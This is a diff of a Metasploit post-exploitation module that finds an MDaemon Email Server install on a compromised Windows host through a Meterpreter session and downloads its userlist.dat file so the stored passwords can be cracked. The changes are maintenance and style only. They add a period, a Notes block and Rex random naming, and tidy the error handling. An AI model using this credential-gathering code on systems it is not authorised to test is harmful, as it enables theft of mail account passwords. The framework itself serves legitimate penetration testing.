@@ -13,7 +13,7 @@ class MetasploitModule < Msf::Post
       update_info(
         info,
         'Name' => 'Windows Gather MDaemonEmailServer Credential Cracking',
-        'Description' => 'Finds and cracks the stored passwords of MDaemon Email Server',
+        'Description' => 'Finds and cracks the stored passwords of MDaemon Email Server.',
         'References' => [
           ['BID', '4686']
         ],
@@ -22,6 +22,11 @@ class MetasploitModule < Msf::Post
         'Platform' => ['win'],
         'Arch' => [ARCH_X86, ARCH_X64],
         'SessionTypes' => ['meterpreter'],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -55,7 +60,7 @@ class MetasploitModule < Msf::Post
 
     progfiles_env = session.sys.config.getenvs('SYSTEMDRIVE', 'HOMEDRIVE', 'ProgramFiles', 'ProgramFiles(x86)', 'ProgramW6432')
     locations = ['C:\MDaemon\App']
-    progfiles_env.each do |_k, v|
+    progfiles_env.each_value do |v|
       vprint_status("Searching MDaemon installation at #{v}")
       if session.fs.dir.entries(v).include? 'MDaemon'
         vprint_status("Found MDaemon installation at #{v}")
@@ -103,34 +108,32 @@ class MetasploitModule < Msf::Post
   end
 
   def check_mdaemons(locations)
-    tmp_filename = (0...12).map { rand(65..90).chr }.join
-    begin
-      locations.each do |location|
-        vprint_status("Checking for Userlist in MDaemons directory at: #{location}")
-        begin
-          session.fs.dir.foreach(location.to_s) do |fdir|
-            ['userlist.dat'].each do |datfile|
-              next if fdir.casecmp(datfile) != 0
+    tmp_filename = Rex::Text.rand_text_alpha_upper(12)
+    locations.each do |location|
+      vprint_status("Checking for Userlist in MDaemons directory at: #{location}")
+      begin
+        session.fs.dir.foreach(location.to_s) do |fdir|
+          ['userlist.dat'].each do |datfile|
+            next if fdir.casecmp(datfile) != 0
 
-              filepath = location + '\\' + datfile
-              print_good("Configuration file found: #{filepath}")
-              print_good("Found MDaemons on #{sysinfo['Computer']} via session ID: #{session.sid}")
-              vprint_status("Downloading UserList.dat file to tmp file: #{tmp_filename}")
-              session.fs.file.download_file(tmp_filename, filepath)
-              # userdat = session.fs.file.open(filepath).read.to_s.split(/\n/)
-              return tmp_filename
-            end
+            filepath = location + '\\' + datfile
+            print_good("Configuration file found: #{filepath}")
+            print_good("Found MDaemons on #{sysinfo['Computer']} via session ID: #{session.sid}")
+            vprint_status("Downloading UserList.dat file to tmp file: #{tmp_filename}")
+            session.fs.file.download_file(tmp_filename, filepath)
+            # userdat = session.fs.file.open(filepath).read.to_s.split(/\n/)
+            return tmp_filename
           end
-        rescue Rex::Post::Meterpreter::RequestError => e
-          vprint_error(e.message)
         end
+      rescue Rex::Post::Meterpreter::RequestError => e
+        vprint_error(e.message)
       end
-    rescue StandardError => e
-      print_error(e.to_s)
-      return
     end
 
     nil
+  rescue StandardError => e
+    print_error(e.to_s)
+    return
   end
 
   def parse_userlist(data)
